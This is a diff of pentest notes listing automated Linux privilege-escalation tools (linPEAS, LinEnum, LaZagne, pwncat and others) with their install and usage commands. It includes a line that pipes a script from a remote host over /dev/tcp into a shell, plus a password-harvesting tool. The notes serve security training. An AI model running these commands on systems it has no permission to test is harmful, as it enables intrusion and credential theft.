@@ -1,20 +1,23 @@
-# `Linux Priv Esc Bible` | http://pentestmonkey.net/tools/audit/unix-privesc-check
+# Automated Checks
 
-[Linux PrivEsc Content](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
+## `Linux Priv Esc Bible` | http://pentestmonkey.net/tools/audit/unix-privesc-check
 
-[Pentest Monkey - Unix PrivEsc Check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
+{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html" %}
 
-***
-## If wget doesn't work :
+{% embed url="https://pentestmonkey.net/tools/audit/unix-privesc-check" %}
+
+### If wget doesn't work :
 
 ```bash
 cat > les.sh
 This file was created using cat (^._.^)
 # Hit Ctrl+D to exit!
 ```
-***
 
-# Linux Exploit Suggester | https://github.com/mzet-/linux-exploit-suggester
+## `linux-exploit-suggester`
+
+{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}
+
 ```bash
 # install
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
@@ -23,7 +26,9 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 ./les.sh
 ```
 
-# Linux Smart Enumeration | https://github.com/diego-treitos/linux-smart-enumeration
+## `linux-smart-enumeration`&#x20;
+
+{% embed url="https://github.com/diego-treitos/linux-smart-enumeration" %}
 
 ```bash
 # install
@@ -37,7 +42,9 @@ curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma
 ./lse.sh -l2 
 ```
 
-# Linpeas | https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+## `linPEAS`
+
+{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}
 
 ```bash
 # install
@@ -67,7 +74,10 @@ cat < /dev/tcp/10.10.10.10/80 | sh
 ./linpeas.sh -P
 ```
 
-# Linux Priv Checker | https://github.com/sleventyeleven/linuxprivchecker
+## `linuxprivchecker`
+
+{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}
+
 ```bash
 # INSTALL
 wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
@@ -84,7 +94,10 @@ linuxprivchecker -w -o linuxprivchecker.log
 python3 -m linuxprivchecker -w -o linuxprivchecker.log
 ```
 
-# LinEnum | https://github.com/rebootuser/LinEnum
+## `LinEnum`
+
+{% embed url="https://github.com/rebootuser/LinEnum" %}
+
 ```bash
 # install
 git clone https://github.com/rebootuser/LinEnum.git
@@ -92,8 +105,12 @@ git clone https://github.com/rebootuser/LinEnum.git
 # usage
 ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
 ```
-# LaZagne | https://github.com/AlessandroZ/LaZagne
->Retrieve lots of passwords stored on a local computer.
+
+## `LaZagne`
+
+{% embed url="https://github.com/AlessandroZ/LaZagne" %}
+
+> Retrieve lots of passwords stored on a local computer.
 
 ```bash
 # install
@@ -106,15 +123,21 @@ cd Linux/
 python laZagne.py
 ```
 
-# Unix PrivEsc Check | https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
+## `unix-privesc-check`
+
+{% embed url="https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz" %}
 
 ```bash
 chmod +x unix-privesc-check
 ./unix-privesc-check > checks.txt
 ```
 
-# Pwncat-cs | https://github.com/calebstewart/pwncat
-## Usage
+## `pwncat`
+
+{% embed url="https://github.com/calebstewart/pwncat" %}
+
+### Usage
+
 ```bash
 # enumeration
 run enumerate # to enumerate the whole server
